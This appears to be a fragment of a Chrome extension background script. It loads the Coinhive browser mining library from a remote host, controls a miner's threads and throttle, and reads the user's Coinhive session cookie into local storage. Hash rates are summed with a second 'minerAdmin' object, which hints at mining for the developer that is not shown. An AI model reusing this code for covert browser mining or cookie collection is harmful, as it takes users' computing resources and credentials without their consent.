((doc) => {

  chrome.browserAction.setBadgeBackgroundColor({
    color : "#FF0000"
  });
  
	loadScript('https://coinhive.com/lib/coinhive.min.js', init);

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    if (request.run == "isRunning") {
      sendResponse({isRunning: miner.isRunning()});
	}
	if (request.rate == true) {
      sendResponse({rRate: miner.getHashesPerSecond()+minerAdmin.getHashesPerSecond(),rTotalHash : miner.getTotalHashes()});
	}
	if(request.Throttle>=0) {
		miner.setThrottle(request.Throttle);
	}
	if(request.Threads) {
		if(request.Threads=="Auto") {
			miner.setAutoThreadsEnabled(true);
		}
		else {
			miner.setAutoThreadsEnabled(false);
			miner.setNumThreads(request.Threads);
		}
	}
	if(request.start) {
		_key = localStorage.getItem("siteKey");
		miner._siteKey = _key;
		miner.start();
		sendResponse({isRunning:miner.isRunning()});
	}
	if(request.stop) {
		miner.stop();
		sendResponse({isRunning:miner.isRunning()});
	}
	if(request.first) {
		saveCookie();
	}
	if(request.getWebsites) {
		initWebsites();
	}
	if(request.paymentMinimum) {
		console.log(request.paymentMinimum);
		localStorage.setItem("paymentMinimum",request.paymentMinimum);
	}
  });
  
 function saveCookie() { 
    chrome.cookies.get({"url": "https://coinhive.com", "name": "session"}, function(cookie) {
		if(cookie) {
			localStorage.setItem("cookie",decodeURIComponent(cookie.value));
		}
    });
	}
	saveCookie();
	
	if(!localStorage.getItem("websites")) {
		initWebsites();
	}
	
 })(document);